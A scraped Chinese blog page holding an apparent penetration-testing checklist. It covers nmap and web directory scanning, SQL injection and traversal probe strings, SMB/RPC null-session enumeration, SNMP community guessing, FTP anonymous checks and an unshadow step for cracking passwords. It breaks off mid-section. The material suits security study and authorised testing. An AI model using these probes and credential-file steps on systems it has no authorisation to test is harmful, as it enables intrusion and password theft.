vulnerability&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;windows&quot;],&quot;text&quot;:[0,&quot;Windows&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;5-domain-penetration&quot;],&quot;text&quot;:[0,&quot;5 Domain penetration&quot;]}]]],&quot;localImagePaths&quot;:[1,[]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Mandatory manual&quot;],&quot;date&quot;:[3,&quot;2026-02-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;imagePaths&quot;:[1,[]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/10&quot;]}]}" ssr client="load" opts="{&quot;name&quot;:&quot;HomeSiderPanel&quot;,&quot;value&quot;:true}" await-children><link rel="preload" as="image" href="/img/724d7fb480c8ac0db472ca5c7e36d239.jpg" fetchPriority="high"/><div class="cursor-pointer rounded-sm bg-black/8 p-1 font-semibold backdrop-blur-lg select-none my-4 flex w-full justify-between text-sm/6"><div class="flex-center relative cursor-pointer gap-1.5 px-3 py-1 first:rounded-l-xs last:rounded-r-xs opacity-50 grow"><span class="flex-center shrink-0"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="w-4 h-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2ZM12 4C7.58172 4 4 7.58172 4 12C4 16.4183 7.58172 20 12 20C16.4183 20 20 16.4183 20 12C20 7.58172 16.4183 4 12 4ZM15.8329 7.33748C16.0697 7.17128 16.3916 7.19926 16.5962 7.40381C16.8002 7.60784 16.8267 7.92955 16.6587 8.16418C14.479 11.2095 13.2796 12.8417 13.0607 13.0607C12.4749 13.6464 11.5251 13.6464 10.9393 13.0607C10.3536 12.4749 10.3536 11.5251 10.9393 10.9393C11.3126 10.5661 12.9438 9.36549 15.8329 7.33748ZM17.5 11C18.0523 11 18.5 11.4477 18.5 12C18.5 12.5523 18.0523 13 17.5 13C16.9477 13 16.5 12.5523 16.5 12C16.5 11.4477 16.9477 11 17.5 11ZM6.5 11C7.05228 11 7.5 11.4477 7.5 12C7.5 12.5523 7.05228 13 6.5 13C5.94772 13 5.5 12.5523 5.5 12C5.5 11.4477 5.94772 11 6.5 11ZM8.81802 7.40381C9.20854 7.79433 9.20854 8.4275 8.81802 8.81802C8.4275 9.20854 7.79433 9.20854 7.40381 8.81802C7.01328 8.4275 7.01328 7.79433 7.40381 7.40381C7.79433 7.01328 8.4275 7.01328 8.81802 7.40381ZM12 5.5C12.5523 5.5 13 5.94772 13 6.5C13 7.05228 12.5523 7.5 12 7.5C11.4477 7.5 11 7.05228 11 6.5C11 5.94772 11.4477 5.5 12 5.5Z"></path></svg></span></div><div class="flex-center relative cursor-pointer gap-1.5 px-3 py-1 first:rounded-l-xs last:rounded-r-xs text-primary-foreground grow"><span class="flex-center shrink-0"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="w-4 h-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M5.75024 3.5H4.71733L3.25 3.89317V5.44582L4.25002 5.17782L4.25018 8.5H3V10H7V8.5H5.75024V3.5ZM10 4H21V6H10V4ZM10 11H21V13H10V11ZM10 18H21V20H10V18ZM2.875 15.625C2.875 14.4514 3.82639 13.5 5 13.5C6.17361 13.5 7.125 14.4514 7.125 15.625C7.125 16.1106 6.96183 16.5587 6.68747 16.9167L6.68271 16.9229L5.31587 18.5H7V20H3.00012L2.99959 18.8786L5.4717 16.035C5.5673 15.9252 5.625 15.7821 5.625 15.625C5.625 15.2798 5.34518 15 5 15C4.67378 15 4.40573 15.2501 4.37747 15.5688L4.3651 15.875H2.875V15.625Z"></path></svg></span><span class="overflow-hidden whitespace-nowrap" style="width:auto;opacity:1">文章目录</span><div class="bg-gradient-shoka-button absolute inset-0 -z-10 rounded-sm" style="will-change:transform"></div></div><div class="flex-center relative cursor-pointer gap-1.5 px-3 py-1 first:rounded-l-xs last:rounded-r-xs opacity-50 grow"><span class="flex-center shrink-0"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="w-4 h-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M20 22H4C3.44772 22 3 21.5523 3 21V3C3 2.44772 3.44772 2 4 2H20C20.5523 2 21 2.44772 21 3V21C21 21.5523 20.5523 22 20 22ZM19 20V4H5V20H19ZM7 6H11V10H7V6ZM7 12H17V14H7V12ZM7 16H17V18H7V16ZM13 7H17V9H13V7Z"></path></svg></span></div></div><div class="vertical-scrollbar pt-10 scroll-gutter-stable relative block w-full flex-1 min-h-0 overflow-x-hidden overflow-y-auto md:pt-4 md:pl-3" data-type="post" data-default-type="directory"><div class="sider-slot" data-slot-type="info"><div class="flex flex-col items-center"><div class="h-40 w-40 rounded-full" style="background-image:linear-gradient(135deg, #9e8764 0%, #ae7b62 50%, #644235 100%)"><img class="shadow-card-darker hover:animate-shake h-full w-full rounded-full transition" src="/img/724d7fb480c8ac0db472ca5c7e36d239.jpg" alt="Kaguya avatar" loading="eager" fetchPriority="high"/></div><p class="mt-2">Kaguya</p><p class="text-muted-foreground mt-3 text-center">ACG / 养猫人 / 菜逼 / 黑客 / 臭美</p><div class="mt-2 grid grid-cols-3 gap-2"><div><a class="social-link flex-center group relative overflow-hidden rounded-xl px-1.5 py-1 transition-all duration-300 group-hover:scale-105" style="--link-color:#191717" data-platform="github" href="https://github.com/XueHua-s" title="GitHub" data-tooltip-interactive="false" data-tooltip-placement="top" aria-label="GitHub"><i class="fa-brands fa-github social-icon" aria-hidden="true"></i><span class="absolute inset-0 -z-10 -translate-x-full translate-y-full rounded-xl transition-transform duration-300 group-hover:translate-x-0 group-hover:translate-y-0"></span></a></div><div><a class="social-link flex-center group relative overflow-hidden rounded-xl px-1.5 py-1 transition-all duration-300 group-hover:scale-105" style="--link-color:#4b9ae4" data-platform="x" href="https://x.com/" title="X (推特)" data-tooltip-interactive="false" data-tooltip-placement="top" aria-label="X (推特)"><i class="fa-brands fa-x-twitter social-icon" aria-hidden="true"></i><span class="absolute inset-0 -z-10 -translate-x-full translate-y-full rounded-xl transition-transform duration-300 group-hover:translate-x-0 group-hover:translate-y-0"></span></a></div><div><a class="social-link flex-center group relative overflow-hidden rounded-xl px-1.5 py-1 transition-all duration-300 group-hover:scale-105" style="--link-color:#55acd5" data-platform="email" href="mailto:xuehualjx@gmail.com" title="Email" data-tooltip-interactive="false" data-tooltip-placement="top" aria-label="Email"><i class="fa-regular fa-envelope social-icon" aria-hidden="true"></i><span class="absolute inset-0 -z-10 -translate-x-full translate-y-full rounded-xl transition-transform duration-300 group-hover:translate-x-0 group-hover:translate-y-0"></span></a></div></div><div class="text-muted-foreground mt-3 flex justify-center text-center text-sm/4 whitespace-nowrap select-none dark:text-white/80"><a href="/blog" class="hover:text-blue flex cursor-pointer flex-col gap-2 p-1 transition"><span class="text-lg/5 font-bold">11</span>文章</a><div class="bg-muted-foreground mx-3 w-px"></div><a href="/blog/categories" aria-label="分类" class="hover:text-blue"><p class="flex cursor-pointer flex-col gap-2 p-1 transition"><span class="text-lg/5 font-bold">4</span>分类</p></a><div class="bg-muted-foreground mx-3 w-px"></div><a href="/blog/tags" class="hover:text-blue flex cursor-pointer flex-col gap-2 p-1 transition"><span class="text-lg/5 font-bold">8</span>标签</a></div><div class="mt-6 flex w-full flex-col items-center gap-2.5"><a href="/blog" aria-label="首页" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-house-chimney" aria-hidden="true"></i>首页</a><div class="bg-foreground/10 flex w-40 flex-col rounded-xl opacity-75 transition-all duration-300 hover:opacity-100" data-collapsible="true"><button class="flex-center hover:bg-foreground/5 h-12 w-full cursor-pointer rounded-xl transition-colors" aria-expanded="false" aria-controls="_r10R_a_-collapse-1" aria-label="文章菜单" type="button"><i class="mr-1.5 fa-solid fa-pen-nib" aria-hidden="true"></i>文章<i class="fa-solid fa-caret-down ml-2 text-base transition-transform duration-300" aria-hidden="true"></i></button><div id="_r10R_a_-collapse-1" class="collapse-content collapse-hidden" data-collapse-content="true"><div class="flex flex-col items-center"><a href="/blog/categories" aria-label="分类" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background transition-colors focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-layer-group" aria-hidden="true"></i>分类</a><a href="/blog/tags" aria-label="标签" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background transition-colors focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-tags" aria-hidden="true"></i>标签</a></div></div></div><a href="/blog/friends" aria-label="友链" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-link" aria-hidden="true"></i>友链</a><a href="/blog/about" aria-label="关于" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-regular fa-circle-user" aria-hidden="true"></i>关于</a></div></div></div><div class="sider-slot hidden" data-slot-type="directory"><nav class="toc-container max-h-[90dvh] overflow-auto " aria-label="文章目录"><div class="space-y-1 pr-2"><div class="heading-tree-item relative"><a href="#nmap基本扫描" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="Nmap基本扫描"><span class="heading-text block flex-1 truncate leading-relaxed">Nmap基本扫描</span></a></div><div class="heading-tree-item relative"><a href="#针对端口指纹和漏洞的扫描" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="针对端口指纹和漏洞的扫描"><span class="heading-text block flex-1 truncate leading-relaxed">针对端口指纹和漏洞的扫描</span></a></div><div class="heading-tree-item relative"><a href="#针对-web-端口的枚举" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="针对 web 端口的枚举"><span class="heading-text block flex-1 truncate leading-relaxed">针对 web 端口的枚举</span></a></div><div class="heading-tree-item relative"><a href="#针对已知的服务进行攻击尝试搜索漏洞信息" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="针对已知的服务进行攻击尝试，搜索漏洞信息"><span class="heading-text block flex-1 truncate leading-relaxed">针对已知的服务进行攻击尝试，搜索漏洞信息</span></a></div><div class="heading-tree-item relative"><a href="#针对-web-页面的测试" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="针对 web 页面的测试"><span class="heading-text block flex-1 truncate leading-relaxed">针对 web 页面的测试</span></a></div><div class="heading-tree-item relative"><a href="#针对-netbiossmbrpc-端口的测试" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="针对 NETBIOS、SMB、RPC 端口的测试"><span class="heading-text block flex-1 truncate leading-relaxed">针对 NETBIOS、SMB、RPC 端口的测试</span></a></div><div class="heading-tree-item relative"><a href="#针对-smtp-端口的尝试" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="针对 SMTP 端口的尝试"><span class="heading-text block flex-1 truncate leading-relaxed">针对 SMTP 端口的尝试</span></a></div><div class="heading-tree-item relative"><a href="#针对-snmp-端口的测试" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="针对 SNMP 端口的测试"><span class="heading-text block flex-1 truncate leading-relaxed">针对 SNMP 端口的测试</span></a></div><div class="heading-tree-item relative"><a href="#针对-ftp-端口测试" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="针对 FTP 端口测试"><span class="heading-text block flex-1 truncate leading-relaxed">针对 FTP 端口测试</span></a></div><div class="heading-tree-item relative"><a href="#密码破解" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="密码破解"><span class="heading-text block flex-1 truncate leading-relaxed">密码破解</span></a></div><div class="heading-tree-item relative"><a href="#数据包抓取" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="数据包抓取"><span class="heading-text block flex-1 truncate leading-relaxed">数据包抓取</span></a></div><div class="heading-tree-item relative"><a href="#参考资料" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="参考资料"><span class="heading-text block flex-1 truncate leading-relaxed">参考资料</span></a></div></div></nav></div><div class="sider-slot hidden" data-slot-type="series"><div class="flex flex-col gap-1"><a href="/blog/post/11" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50 text-primary font-medium"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-primary"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-primary">Common process for handling objectives</span></a><a href="/blog/post/10" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">Mandatory manual</span></a></div></div></div><div class="border-border mt-4 flex flex-col gap-3 border-t pt-4 md:mt-0 md:pt-2 w-full px-2"><div class="flex items-center justify-between gap-2"><div class="max-w-[45%] flex-1"></div><a href="/blog/post/10" class="group flex items-center gap-1.5 rounded-md px-2 py-1.5 transition-colors hover:bg-accent text-muted-foreground hover:text-primary max-w-[45%] min-w-0 flex-1 justify-end text-right" title="Mandatory manual"><span class="truncate text-xs">Mandatory manual</span><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4 shrink-0" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M13.1717 12.0007L8.22192 7.05093L9.63614 5.63672L16.0001 12.0007L9.63614 18.3646L8.22192 16.9504L13.1717 12.0007Z"></path></svg></a></div><div class="flex justify-center gap-2"><button class="flex items-center justify-center gap-1.5 rounded-md px-3 py-1.5 transition-colors hover:bg-accent text-muted-foreground hover:text-primary text-xs" title="回到顶部" aria-label="回到顶部"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M11.9999 10.8284L7.0502 15.7782L5.63599 14.364L11.9999 8L18.3639 14.364L16.9497 15.7782L11.9999 10.8284Z"></path></svg>回到顶部</button><button class="flex items-center justify-center gap-1.5 rounded-md px-3 py-1.5 transition-colors hover:bg-accent text-muted-foreground hover:text-primary text-xs" title="滚到底部" aria-label="滚到底部"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M11.9999 13.1714L16.9497 8.22168L18.3639 9.63589L11.9999 15.9999L5.63599 9.63589L7.0502 8.22168L11.9999 13.1714Z"></path></svg>滚到底部</button></div></div><div class="mt-auto w-full rounded-full pt-4 sticky bottom-0"><div class="bg-primary h-1 origin-left rounded-full scale-x-0"></div></div><!--astro:end--></astro-island> </div> <div class="flex min-w-0 grow flex-col gap-8 md:w-full">     <div class="shadow-box bg-gradient-start flex flex-col gap-2 px-10 py-8 tablet:px-6 tablet:pt-6 tablet:pb-2"> <!-- Breadcrumb Navigation --> <nav class="text-muted-foreground flex items-center gap-2 text-sm"> <div class="flex items-center gap-1"> <!-- Home Icon and Link --> <i class="fa-solid fa-house-chimney text-sm" aria-hidden="true"></i> <a href="/blog" aria-label="返回首页"> <span class="hover:text-blue transition-colors duration-300">首页</span> </a> </div> <!-- Category Breadcrumbs -->  <i class="fa-solid fa-angle-right text-muted-foreground/60 text-sm" aria-hidden="true"></i> <a href="/blog/categories/Penetration" class="hover:text-blue transition-colors duration-300 text-primary bg-primary/10 hover:text-primary hover:bg-primary/20 rounded-full px-2.5 py-1" aria-label="前往Penetration分类"> Penetration </a>  </nav> <astro-island uid="Crxor" prefix="r3" component-url="/_astro/SummaryPanel.s-MDUzWg.js" component-export="SummaryPanel" renderer-url="/_astro/client.lBR8ML2S.js" props="{&quot;summary&quot;:[0,&quot;Nmap基本扫描 针对端口指纹和漏洞的扫描 针对 web 端口的枚举 针对已知的服务进行攻击尝试，搜索漏洞信息 漏洞来源： 针对 web 页面的测试 检查页面信息，审查元素、查看 cookie、tamper 数据、可以使用 curl/wget 在线搜索资源（比如 github），如果应用程序是开源的，根据网站枚举的信息猜测版本，然后找出可能存在的风险 检查 HTTP 选项&quot;],&quot;source&quot;:[0,&quot;auto&quot;],&quot;className&quot;:[0,&quot;mt-2&quot;]}" ssr client="visible" opts="{&quot;name&quot;:&quot;SummaryPanel&quot;,&quot;value&quot;:true}" await-children><div class="overflow-hidden rounded-lg mt-2"><button class="bg-foreground/5 flex w-full cursor-pointer items-center justify-between px-4 py-3 transition-all duration-250 hover:bg-foreground/10 rounded-lg" aria-expanded="false" aria-controls="summary-panel-content"><div class="text-muted-foreground flex items-center gap-1.5 text-sm font-medium"><span class="transition-transform duration-300"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="text-primary size-4" aria-hidden="true"><path d="M20 22H4C3.44772 22 3 21.5523 3 21V3C3 2.44772 3.44772 2 4 2H20C20.5523 2 21 2.44772 21 3V21C21 21.5523 20.5523 22 20 22ZM19 20V4H5V20H19ZM7 6H11V10H7V6ZM7 12H17V14H7V12ZM7 16H17V18H7V16ZM13 7H17V9H13V7Z"></path></svg></span>摘要</div><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="text-muted-foreground size-4 transition-transform duration-300" aria-hidden="true"><path d="M12 16L6 10H18L12 16Z"></path></svg></button><div id="summary-panel-content" class="grid transition-[grid-template-rows] duration-300 ease-out" style="grid-template-rows:0fr"><div class="overflow-hidden"><div class="bg-foreground/5 text-muted-foreground rounded-b-lg px-4 py-4 text-sm leading-relaxed"><span class="sr-only">Nmap基本扫描 针对端口指纹和漏洞的扫描 针对 web 端口的枚举 针对已知的服务进行攻击尝试，搜索漏洞信息 漏洞来源： 针对 web 页面的测试 检查页面信息，审查元素、查看 cookie、tamper 数据、可以使用 curl/wget 在线搜索资源（比如 github），如果应用程序是开源的，根据网站枚举的信息猜测版本，然后找出可能存在的风险 检查 HTTP 选项</span><p aria-hidden="true"><span></span></p></div></div></div></div><!--astro:end--></astro-island> <article class="prose md:prose-sm dark:prose-invert"> <div class="custom-content"> <h1 id="nmap基本扫描">Nmap基本扫描<a class="anchor-link" href="#nmap基本扫描"><span class="icon icon-link"></span></a></h1>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>nmap -Pn -p- -vv</span></span>
<span class="line"><span>nmap -Pn -p- -sU -vv</span></span></code></pre>
<hr>
<h1 id="针对端口指纹和漏洞的扫描">针对端口指纹和漏洞的扫描<a class="anchor-link" href="#针对端口指纹和漏洞的扫描"><span class="icon icon-link"></span></a></h1>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Nmap -Pn -sV -O -pT:{TCP ports found in step 1},U:{UDP ports found in step 1} -script vuln &#x3C;ip address></span></span>
<span class="line"><span># 使用nc查看banner</span></span>
<span class="line"><span>nc -nv &#x3C;ip-address> &#x3C;port></span></span></code></pre>
<hr>
<h1 id="针对-web-端口的枚举">针对 web 端口的枚举<a class="anchor-link" href="#针对-web-端口的枚举"><span class="icon icon-link"></span></a></h1>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Nikto -port {web ports} -host &#x3C;ip address> -o &#x3C;output file.txt></span></span>
<span class="line"><span># 目录扫描</span></span>
<span class="line"><span>Dirb http{s}://&#x3C;ip address>:&#x3C;port> /usr/share/wordlist/dirb/{common/small/vulns}.txt</span></span>
<span class="line"><span>Gobuster -u http://&#x3C;ip-address> -w /usr/share/Seclists/Discovery/Web_Content/common.txt</span></span>
<span class="line"><span>#如果想测试文件包含漏洞，可以使用 fimap：</span></span>
<span class="line"><span>fimap -u &#x3C;ip-address></span></span></code></pre>
<hr>
<h1 id="针对已知的服务进行攻击尝试搜索漏洞信息">针对已知的服务进行攻击尝试，搜索漏洞信息<a class="anchor-link" href="#针对已知的服务进行攻击尝试搜索漏洞信息"><span class="icon icon-link"></span></a></h1>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Searchsploit &#x3C;service name></span></span></code></pre>
<p>漏洞来源：
<a href="https://www.securityfocus.com/vulnerabilities">https://www.securityfocus.com/vulnerabilities</a></p>
<hr>
<h1 id="针对-web-页面的测试">针对 web 页面的测试<a class="anchor-link" href="#针对-web-页面的测试"><span class="icon icon-link"></span></a></h1>
<p>检查页面信息，审查元素、查看 cookie、tamper 数据、可以使用 curl/wget
在线搜索资源（比如 github），如果应用程序是开源的，根据网站枚举的信息猜测版本，然后找出可能存在的风险
检查 HTTP 选项</p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>测试输入表单参数（比如 1' or 1=1 limit 1; # AND 1' or 1=1--）</span></span>
<span class="line"><span>● NULL 或 null</span></span>
<span class="line"><span>● ', ", ;, &#x3C;!</span></span>
<span class="line"><span>  ○ 中断 SQL 字符串或查询，常用于 SQL、XPath、XML 注入</span></span>
<span class="line"><span>● -, =, +, "</span></span>
<span class="line"><span>  ○ 用于手工 SQL 注入测试</span></span>
<span class="line"><span>● ', &#x26;, ! , ¦ , &#x3C; , ></span></span>
<span class="line"><span>  ○ 用于找出命令执行漏洞</span></span>
<span class="line"><span>● ../</span></span>
<span class="line"><span>  ○ 目录穿越漏洞</span></span></code></pre>
<hr>
<h1 id="针对-netbiossmbrpc-端口的测试">针对 NETBIOS、SMB、RPC 端口的测试<a class="anchor-link" href="#针对-netbiossmbrpc-端口的测试"><span class="icon icon-link"></span></a></h1>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>enum4linux -a &#x3C;ip address> Rpcclient &#x3C;ip address> -U "" -N Rpcinfo -p &#x3C;target ip></span></span></code></pre>
<p>关于 RPC 历史漏洞的合集：
<a href="http://etutorials.org/Networking/network+security+assessment/Chapter+12.+Assessing+Unix+RPC+Services/12.2+RPC+Service+Vulnerabilities/">http://etutorials.org/Networking/network+security+assessment/Chapter+12.+Assessing+Unix+RPC+Services/12.2+RPC+Service+Vulnerabilities/</a>
以下是常用的远程测试命令</p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Showmount -e &#x3C;ip address>/&#x3C;port> </span></span>
<span class="line"><span>Mount -t cifs //&#x3C;server ip>/&#x3C;share> &#x3C;local dir> -o username=”guest”,password=”” </span></span>
<span class="line"><span>Rlogin &#x3C;ip-address> Smbclient -L &#x3C;ip-address> -U “” -N Nbtscan -r &#x3C;ip address> </span></span>
<span class="line"><span>Net use &#x3C;ip-address>$Share “” /u:”” </span></span>
<span class="line"><span>Net view &#x3C;ip-address></span></span></code></pre>
<p>还可以使用 NMAP 的脚本测试 SMB、DCERPC、NETBIOS</p>
<hr>
<h1 id="针对-smtp-端口的尝试">针对 SMTP 端口的尝试<a class="anchor-link" href="#针对-smtp-端口的尝试"><span class="icon icon-link"></span></a></h1>
<p>枚举用户，使用 VRFY 和 EXPN 命令</p>
<hr>
<h1 id="针对-snmp-端口的测试">针对 SNMP 端口的测试<a class="anchor-link" href="#针对-snmp-端口的测试"><span class="icon icon-link"></span></a></h1>
<p>默认共享名称如：public, private, cisco, manager
使用工具：</p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Onesixtyone –c &#x3C;community list file> -I &#x3C;ip-address> Snmpwalk -c &#x3C;community string> -v&#x3C;version> &#x3C;ip address></span></span>
<span class="line"><span># 默认 MIB：</span></span>
<span class="line"><span>1.3.6.1.2.1.25.1.6.0 System Processes 1.3.6.1.2.1.25.4.2.1.2 Running Programs 1.3.6.1.2.1.25.4.2.1.4 Processes Path 1.3.6.1.2.1.25.2.3.1.4 Storage Units 1.3.6.1.2.1.25.6.3.1.2 Software Name 1.3.6.1.4.1.77.1.2.25 User Accounts 1.3.6.1.2.1.6.13.1.3 TCP Local Ports</span></span>
<span class="line"><span># 比如枚举运行的进程</span></span>
<span class="line"><span>nmpwalk -c public -v1 192.168.11.204 1.3.6.1.2.1.25.4.2.1.2</span></span></code></pre>
<hr>
<h1 id="针对-ftp-端口测试">针对 FTP 端口测试<a class="anchor-link" href="#针对-ftp-端口测试"><span class="icon icon-link"></span></a></h1>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>● anonymous 是否可以登录</span></span>
<span class="line"><span>● 如果可以登录是否可以使用 get 或 send 操作文件</span></span>
<span class="line"><span>● 使用浏览器是否可以访问，ftp://&#x3C;ip-address></span></span></code></pre>
<hr>
<h1 id="密码破解">密码破解<a class="anchor-link" href="#密码破解"><span class="icon icon-link"></span></a></h1>
<p>在 linux 下可以使用 unshadow 命令合并 passwd 和 shadow 文件：</p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>unshadow [passwd-file] [shadow-file] > unshadowed.txt</span></span>
